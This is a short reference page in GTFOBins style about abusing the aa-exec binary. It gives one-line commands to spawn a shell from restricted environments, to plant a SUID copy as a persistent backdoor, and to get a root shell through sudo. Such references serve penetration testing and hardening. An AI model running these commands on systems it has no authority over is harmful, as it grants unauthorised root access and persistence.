---
title: "aa-exec"
author: GTFObins
categories: Tips
series: GTFObins
tags: [shell,suid,sudo]
toc: false
---

# Shell

It can be used to break out from restricted environments by spawning an interactive system shell.

```bash
aa-exec /bin/sh
```

# SUID

If the binary has the SUID bit set, it does not drop the elevated privileges and may be abused to access the file system, escalate or maintain privileged access as a SUID backdoor. If it is used to run `sh -p`, omit the `-p` argument on systems like Debian (<= Stretch) that allow the default `sh` shell to run with SUID privileges.

This example creates a local SUID copy of the binary and runs it to maintain elevated privileges. To interact with an existing SUID binary skip the first command and run the program using its original path.

```bash
sudo install -m =xs $(which aa-exec) .

./aa-exec /bin/sh -p
```

# Sudo

If the binary is allowed to run as superuser by sudo, it does not drop the elevated privileges and may be used to access the file system, escalate or maintain privileged access.

```bash
sudo aa-exec /bin/sh
```
